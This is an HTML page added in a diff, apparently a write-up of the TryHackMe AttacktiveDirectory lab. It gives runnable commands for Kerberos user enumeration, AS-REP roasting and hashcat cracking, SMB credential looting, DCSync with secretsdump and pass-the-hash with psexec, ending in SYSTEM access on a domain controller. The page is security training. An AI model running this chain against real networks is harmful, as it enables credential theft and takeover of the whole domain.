@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="TryHackMe AttacktiveDirectory Writeup - Kerberos enumeration, AS-REP roasting, SMB loot, backup credentials, BloodHound validation and SYSTEM on the domain controller.">
+  <link rel="canonical" href="https://abdelaaziz0.github.io/writeups/attacktive-directory.html">
+  <link rel="icon" href="/favicon.ico" sizes="any">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://abdelaaziz0.github.io/writeups/attacktive-directory.html">
+  <meta property="og:title" content="AttacktiveDirectory - TryHackMe Writeup">
+  <meta property="og:description" content="TryHackMe AttacktiveDirectory Writeup - Kerberos enumeration, AS-REP roasting, SMB loot, backup credentials, BloodHound validation and SYSTEM on the domain controller.">
+  <meta property="og:image" content="https://abdelaaziz0.github.io/assets/img/profile.webp">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="AttacktiveDirectory - TryHackMe Writeup">
+  <meta name="twitter:description" content="TryHackMe AttacktiveDirectory Writeup - Kerberos enumeration, AS-REP roasting, SMB loot, backup credentials, BloodHound validation and SYSTEM on the domain controller.">
+  <meta name="twitter:image" content="https://abdelaaziz0.github.io/assets/img/profile.webp">
+<title>AttacktiveDirectory - TryHackMe Writeup</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="stylesheet" href="../assets/css/writeup.css">
+</head>
+<body>
+
+<header>
+  <nav>
+  <a class="nav-logo" href="../index.html">AB_</a>
+  <ul class="nav-links">
+    <li><a href="../index.html#snapshot">Profil</a></li>
+    <li><a href="../projects.html">Travail</a></li>
+    <li><a href="../writeups.html" class="active">Writeups</a></li>
+    <li><a href="../blog.html">Articles</a></li>
+    <li><a href="../index.html#contact">Contact</a></li>
+    <li><a href="../cv.pdf" download>CV</a></li>
+  </ul>
+</nav>
+</header>
+
+  <div class="wrapper">
+
+  <div class="back-row">
+    <a class="back-link" href="../writeups.html">← Retour aux analyses</a>
+  </div>
+  <div class="hero">
+    <span class="hero-category">TryHackMe - Active Directory</span>
+    <h1>AttacktiveDirectory</h1>
+    <p class="hero-sub">
+      A clean Active Directory chain built around Kerberos signals: user enumeration,
+      AS-REP roasting, SMB credential recovery, BloodHound validation, and final execution
+      on the domain controller.
+    </p>
+    <div class="hero-meta">
+      <span class="tag tag-date">2026-04-18</span>
+      <span class="tag tag-cat">Active Directory</span>
+      <span class="tag tag-cat">Kerberos</span>
+      <span class="tag tag-cat">Windows</span>
+      <span class="tag tag-hard">THM</span>
+      <span class="tag tag-win">SPOOKYSEC.LOCAL</span>
+    </div>
+    <div class="stats-row">
+      <div class="stat"><span class="stat-val">4</span><span class="stat-label">Primitives</span></div>
+      <div class="stat"><span class="stat-val">1</span><span class="stat-label">DC</span></div>
+      <div class="stat"><span class="stat-val">SYSTEM</span><span class="stat-label">Impact</span></div>
+      <div class="stat"><span class="stat-val">0</span><span class="stat-label">CVEs Used</span></div>
+    </div>
+  </div>
+  <div class="toc">
+    <div class="toc-title">Table of Contents</div>
+    <ol>
+      <li><a href="#s1">Environment &amp; Scope</a></li>
+      <li><a href="#s2">Kerberos Surface &amp; User Enumeration</a></li>
+      <li><a href="#s3">AS-REP Roasting svc-admin</a></li>
+      <li><a href="#s4">SMB Loot &amp; Backup Credentials</a></li>
+      <li><a href="#s5">BloodHound - Why the Backup Account Matters</a></li>
+      <li><a href="#s6">Domain Replication Abuse</a></li>
+      <li><a href="#s7">Pass-the-Hash to SYSTEM</a></li>
+      <li><a href="#s8">Flags &amp; Evidence</a></li>
+      <li><a href="#s9">Full Attack Chain</a></li>
+      <li><a href="#s10">Key Takeaways</a></li>
+    </ol>
+  </div>
+  <section id="s1">
+    <span class="section-number">01 - Environment &amp; Scope</span>
+    <h2>Environment &amp; Scope</h2>
+
+    <p>AttacktiveDirectory is a TryHackMe Active Directory room. The target exposes a single
+    Windows domain controller for <code>SPOOKYSEC.LOCAL</code>. The important point is not the
+    number of ports, but the combination of Kerberos, LDAP, SMB, and weak account hygiene.</p>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Host</th><th>IP</th><th>Role</th><th>Domain</th></tr></thead>
+        <tbody>
+          <tr><td>Kali</td><td>VPN address</td><td>Attack box</td><td>-</td></tr>
+          <tr><td>Domain Controller</td><td><code>&lt;target-ip&gt;</code></td><td>DC, SMB, LDAP, Kerberos</td><td><code>SPOOKYSEC.LOCAL</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout">
+      <span class="callout-label">Note on the IP</span>
+      TryHackMe target IPs rotate per deployment. Commands below keep the address as
+      <code>&lt;target-ip&gt;</code>. Replace it with the IP shown by your room instance.
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Account</th><th>Secret</th><th>Type</th><th>How Obtained</th></tr></thead>
+        <tbody>
+          <tr><td><code>svc-admin</code></td><td><code>REDACTED_SVC_ADMIN_PASSWORD</code></td><td>Plaintext</td><td>AS-REP roast + hashcat</td></tr>
+          <tr><td><code>backup</code></td><td><code>REDACTED_BACKUP_PASSWORD</code></td><td>Plaintext</td><td>Base64 credential in SMB backup share</td></tr>
+          <tr><td><code>Administrator</code></td><td><code>&lt;NTLM hash&gt;</code></td><td>NTLM</td><td>Domain replication dump</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+  <section id="s2">
+    <span class="section-number">02 - Recon</span>
+    <h2>Kerberos Surface &amp; User Enumeration</h2>
+
+    <div class="signal">
+      <span class="signal-label">What pointed us here</span>
+      Port 88 was open, so Kerberos was directly reachable. In AD, that means we can often
+      validate usernames before having a password. This is better than guessing through SMB
+      because Kerberos gives cleaner account-state feedback.
+    </div>
+
+    <p>The first useful step was to identify valid usernames. Kerberos user enumeration works
+    because the KDC responds differently when the principal exists. We are not trying to log in
+    yet. We are asking the KDC which names are real enough to receive Kerberos processing.</p>
+
+<pre><code><span class="comment"># Enumerate valid users against the KDC</span>
+kerbrute userenum \
+    --dc &lt;target-ip&gt; \
+    -d spookysec.local \
+    userlist.txt
+
+<span class="good">[+] VALID USERNAME: svc-admin@spookysec.local</span>
+<span class="good">[+] VALID USERNAME: backup@spookysec.local</span></code></pre>
+
+    <p>The account that mattered immediately was <code>svc-admin</code>. Service accounts often
+    carry old passwords and weak pre-authentication settings. That combination is exactly what
+    AS-REP roasting needs.</p>
+  </section>
+  <section id="s3">
+    <span class="section-number">03 - Credential Access</span>
+    <h2>AS-REP Roasting svc-admin</h2>
+
+    <div class="signal">
+      <span class="signal-label">What pointed us here</span>
+      <code>svc-admin</code> looked like a service identity and Kerberos was exposed. The next
+      question was simple: does this account have <code>DONT_REQ_PREAUTH</code> enabled? If yes,
+      the KDC will return crackable encrypted material without us knowing the password.
+    </div>
+
+    <p>AS-REP roasting abuses a configuration mistake, not a software bug. Normally, Kerberos
+    pre-authentication forces the client to prove knowledge of the password before the KDC
+    sends anything useful. If pre-auth is disabled, the KDC sends an AS-REP encrypted with the
+    user's key. We take that blob offline and crack it.</p>
+
+<pre><code><span class="comment"># Request AS-REP material for users that do not require pre-auth</span>
+impacket-GetNPUsers \
+    spookysec.local/ \
+    -dc-ip &lt;target-ip&gt; \
+    -usersfile users.txt \
+    -no-pass \
+    -outputfile asrep.hashes
+
+<span class="comment"># Crack the AS-REP hash</span>
+hashcat -m 18200 -a 0 asrep.hashes /usr/share/wordlists/rockyou.txt --username
+
+<span class="good">svc-admin:REDACTED_SVC_ADMIN_PASSWORD</span></code></pre>
+
+    <p>At this point we had a real domain credential. Not admin, but enough to enumerate SMB
+    shares and AD relationships properly.</p>
+  </section>
+  <section id="s4">
+    <span class="section-number">04 - Loot</span>
+    <h2>SMB Loot &amp; Backup Credentials</h2>
+
+    <div class="signal">
+      <span class="signal-label">What pointed us here</span>
+      A cracked service account is usually not the final account. The value is in what it can
+      read. SMB share enumeration is the fastest way to turn one weak password into the next
+      credential.
+    </div>
+
+<pre><code><span class="comment"># Enumerate readable shares using svc-admin</span>
+smbmap -H &lt;target-ip&gt; \
+    -d spookysec.local \
+    -u svc-admin \
+    -p 'REDACTED_SVC_ADMIN_PASSWORD'
+
+<span class="comment"># Pull backup material from the readable share</span>
+smbclient //&lt;target-ip&gt;/backup \
+    -U 'spookysec.local/svc-admin%REDACTED_SVC_ADMIN_PASSWORD'
+
+smb: \&gt; ls
+smb: \&gt; get backup_credentials.txt</code></pre>
+
+    <p>The file was not encrypted. It was only base64 encoded. This matters operationally:
+    base64 is not protection, it is just a transport encoding. Treat any credential-looking
+    blob in a share as sensitive until proven otherwise.</p>
+
+<pre><code><span class="comment"># Decode the recovered credential</span>
+cat backup_credentials.txt | base64 -d
+
+<span class="good">backup:REDACTED_BACKUP_PASSWORD</span></code></pre>
+  </section>
+  <section id="s5">
+    <span class="section-number">05 - Path Validation</span>
+    <h2>BloodHound - Why the Backup Account Matters</h2>
+
+    <div class="signal">
+      <span class="signal-label">What pointed us here</span>
+      The account name <code>backup</code> is suspicious by role. In Windows domains, backup
+      operators and service backup identities are often over-permissioned because they need to
+      touch sensitive files or directory data. BloodHound answers the important question:
+      is this just a normal user, or does it have a path to domain compromise?
+    </div>
+
+    <p>We collected AD data with the recovered credential and checked the account's effective
+    rights. The point of BloodHound here was not to decorate the writeup with a graph. It was to
+    confirm why the next step was legitimate: the backup identity could reach sensitive domain
+    data.</p>
+
+<pre><code><span class="comment"># Collect domain data</span>
+bloodhound-python \
+    -d spookysec.local \
+    -u backup \
+    -p 'REDACTED_BACKUP_PASSWORD' \
+    -ns &lt;target-ip&gt; \
+    -dc dc.spookysec.local \
+    -c All
+
+<span class="comment"># Then inspect the backup account path in BloodHound</span></code></pre>
+
+    <p>The useful interpretation is simple: a credential that can read or replicate directory
+    secrets is effectively a domain-compromise credential, even if it is not named
+    <code>Administrator</code>.</p>
+  </section>
+  <section id="s6">
+    <span class="section-number">06 - Privilege Escalation</span>
+    <h2>Domain Replication Abuse</h2>
+
+    <div class="signal">
+      <span class="signal-label">What pointed us here</span>
+      The <code>backup</code> account gave us the right kind of access to domain secrets. In AD,
+      the fastest way to turn that into full compromise is to ask the DC for replicated password
+      data, then use the Administrator NTLM hash.
+    </div>
+
+    <p>DCSync is not code execution. It is directory replication abuse. If an account has the
+    required replication privileges, it can ask the domain controller for password material the
+    same way another DC would. The DC is not being exploited. It is obeying permissions.</p>
+
+<pre><code><span class="comment"># Dump domain secrets with the backup credential</span>
+impacket-secretsdump \
+    'spookysec.local/backup:REDACTED_BACKUP_PASSWORD@&lt;target-ip&gt;' \
+    -dc-ip &lt;target-ip&gt; \
+    -just-dc
+
+<span class="good">Administrator:500:&lt;empty-lm&gt;:&lt;administrator-ntlm&gt;:::</span></code></pre>
+
+    <p>The Administrator plaintext password was not needed. NTLM was enough because SMB and
+    remote service creation accept pass-the-hash in this context.</p>
+  </section>
+  <section id="s7">
+    <span class="section-number">07 - Impact</span>
+    <h2>Pass-the-Hash to SYSTEM</h2>
+
+    <p>With the Administrator NTLM hash, we used SMB remote execution. The payload lands as a
+    Windows service, which is why the shell runs as <code>NT AUTHORITY\SYSTEM</code> instead of
+    merely as the Administrator user context.</p>
+
+<pre><code><span class="comment"># Execute on the DC using the Administrator hash</span>
+impacket-psexec \
+    -hashes ':&lt;administrator-ntlm&gt;' \
+    'spookysec.local/Administrator@&lt;target-ip&gt;'
+
+<span class="good">C:\Windows\system32&gt; whoami</span>
+<span class="good">nt authority\system</span></code></pre>
+  </section>
+  <section id="s8">
+    <span class="section-number">08 - Evidence</span>
+    <h2>Flags &amp; Evidence</h2>
+
+    <p>The old context confirms that the user, backup privilege-escalation flag, and root flag
+    were found. Their exact values were not present in the saved context, so I am not fabricating
+    them here.</p>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Evidence</th><th>Location / Phase</th><th>Status</th></tr></thead>
+        <tbody>
+          <tr><td><code>user.txt</code></td><td>After svc-admin access</td><td>Found</td></tr>
+          <tr><td>Backup flag</td><td>Backup credential phase</td><td>Found</td></tr>
+          <tr><td><code>root.txt</code></td><td>After SYSTEM on DC</td><td>Found</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+  <section id="s9">
+    <span class="section-number">09 - Summary</span>
+    <h2>Full Attack Chain</h2>
+
+    <div class="ascii-chain">
+<pre><code>
+  KERBEROS USER ENUMERATION
+  ─────────────────────────────────────────────────────────────────────
+  Port 88 open on the domain controller
+  Kerbrute identifies valid principals in SPOOKYSEC.LOCAL
+  Interesting account: svc-admin
+       │
+       ▼
+  AS-REP ROAST
+  ─────────────────────────────────────────────────────────────────────
+  svc-admin does not require Kerberos pre-authentication
+  GetNPUsers returns crackable AS-REP material
+  hashcat mode 18200 cracks it
+  Credential: svc-admin:REDACTED_SVC_ADMIN_PASSWORD
+       │
+       ▼
+  SMB ENUMERATION
+  ─────────────────────────────────────────────────────────────────────
+  svc-admin reads backup share
+  backup_credentials.txt is base64, not encryption
+  Decoded credential: backup:REDACTED_BACKUP_PASSWORD
+       │
+       ▼
+  BLOODHOUND VALIDATION
+  ─────────────────────────────────────────────────────────────────────
+  backup account is not just another low-priv user
+  Effective rights allow access to sensitive domain password material
+       │
+       ▼
+  DOMAIN REPLICATION ABUSE
+  ─────────────────────────────────────────────────────────────────────
+  secretsdump asks the DC for replicated password data
+  Administrator NTLM hash recovered
+       │
+       ▼
+  PASS-THE-HASH EXECUTION
+  ─────────────────────────────────────────────────────────────────────
+  psexec with Administrator NTLM hash
+  Shell runs as NT AUTHORITY\SYSTEM on the domain controller
+</code></pre>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>Phase</th><th>Technique</th><th>Vector / Signal</th><th>Result</th></tr>
+        </thead>
+        <tbody class="chain-table">
+          <tr><td>01</td><td>Kerberos user enum</td><td>Port 88 open</td><td>Valid usernames</td></tr>
+          <tr><td>02</td><td>AS-REP roast</td><td>svc-admin without pre-auth</td><td><code>svc-admin:REDACTED_SVC_ADMIN_PASSWORD</code></td></tr>
+          <tr><td>03</td><td>SMB share loot</td><td>Readable backup share</td><td><code>backup:REDACTED_BACKUP_PASSWORD</code></td></tr>
+          <tr><td>04</td><td>Replication abuse</td><td>Backup account has sensitive rights</td><td>Administrator NTLM</td></tr>
+          <tr><td>05</td><td>Pass-the-hash</td><td>SMB remote service creation</td><td><code>NT AUTHORITY\SYSTEM</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+  <section id="s10">
+    <span class="section-number">10 - Lessons</span>
+    <h2>Key Takeaways</h2>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Concept</th><th>Lesson</th></tr></thead>
+        <tbody>
+          <tr>
+            <td>Kerberos enumeration</td>
+            <td>When port 88 is exposed, validate users through the KDC before touching noisy
+            authentication paths. A username list is often enough to start the chain.</td>
+          </tr>
+          <tr>
+            <td>AS-REP roasting</td>
+            <td>The issue is the absence of pre-authentication. The account gives you encrypted
+            material before you know the password, and cracking happens offline.</td>
+          </tr>
+          <tr>
+            <td>SMB loot</td>
+            <td>A cracked domain user should immediately be tested against SMB shares. Files named
+            backup, credentials, deploy, old, or config deserve priority.</td>
+          </tr>
+          <tr>
+            <td>Base64</td>
+            <td>Base64 is not protection. It is only encoding. Decode first, then decide whether
+            the data has security value.</td>
+          </tr>
+          <tr>
+            <td>DCSync</td>
+            <td>Replication abuse is permission abuse. The DC is doing what the ACL permits, so
+            detection has to focus on who is asking for replication, not only on exploit behavior.</td>
+          </tr>
+          <tr>
+            <td>Pass-the-hash</td>
+            <td>Administrator NTLM is enough for remote execution when SMB accepts it. You do not
+            need plaintext once the hash lands.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="pwned-badge">
+      <div class="pwned-dot"></div>
+      Room Completed - Kerberos Enum → AS-REP Roast → SMB Loot → Replication Abuse → SYSTEM
+    </div>
+  </section>
+
+</div>
+
+<footer>
+  © 2026 &nbsp;·&nbsp; TryHackMe AttacktiveDirectory Writeup &nbsp;·&nbsp; Windows AD
+</footer>
+
+</body>
+</html>
